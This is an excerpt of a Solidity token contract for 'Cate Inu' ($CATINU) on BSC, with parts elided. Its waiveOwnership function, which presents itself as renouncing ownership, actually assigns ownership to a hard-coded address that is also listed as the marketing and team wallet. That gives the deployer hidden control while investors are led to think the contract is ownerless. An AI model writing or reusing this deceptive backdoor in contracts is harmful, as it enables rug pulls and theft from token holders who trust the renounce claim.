...
Telegram : https://t.me/CateinuBSC
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xBe036a3B5E4C41780FAfdDc18d9B4D126564799A);
    }
...
contract CateInu is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Cate Inu";
    string private _symbol = "$CATINU";
    uint8 private _decimals = 18;

    address payable public marketingWalletAddress = payable(0xBe036a3B5E4C41780FAfdDc18d9B4D126564799A); // Marketing Address
    address payable public teamWalletAddress = payable(0xBe036a3B5E4C41780FAfdDc18d9B4D126564799A); // Team Address
